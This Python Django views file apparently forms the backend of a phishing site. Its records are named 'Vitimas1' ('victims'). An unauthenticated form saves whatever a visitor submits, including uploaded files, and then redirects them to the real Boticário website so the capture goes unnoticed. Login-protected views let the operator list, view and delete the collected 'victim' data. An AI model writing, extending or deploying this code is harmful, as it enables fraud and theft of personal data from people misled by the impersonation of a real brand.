from django.shortcuts import render,redirect,get_object_or_404, HttpResponse
from django.contrib.auth.decorators import login_required
from .models import Vitimas1
from .forms import VitimaForm

# Create your views here.
@login_required
def vitima_list(request):
    vitimas1 = Vitimas1.objects.all()
    return render(request, 'vitima.html', {'vitimas1':vitimas1})

def vitimas_new(request):
    form = VitimaForm(request.POST or None, request.FILES or None)

    if form.is_valid():
        form.save()
        return redirect('https://www.boticario.com.br')
    return render(request, 'vitima_form.html', {'form': form})
@login_required
def vitima_dados(request,id):
    vitimas1 = get_object_or_404(Vitimas1, pk=id)
    return render(request, 'vitima_dados.html', {'vitimas1':vitimas1})
@login_required
def vitima_delete(request, id):
    vitimas1 = get_object_or_404(Vitimas1, pk=id)

    if request.method == 'POST':
        vitimas1.delete()
        return redirect('vitima_list')

    return render(request, 'vitima_delete.html', {'vitimas1': vitimas1})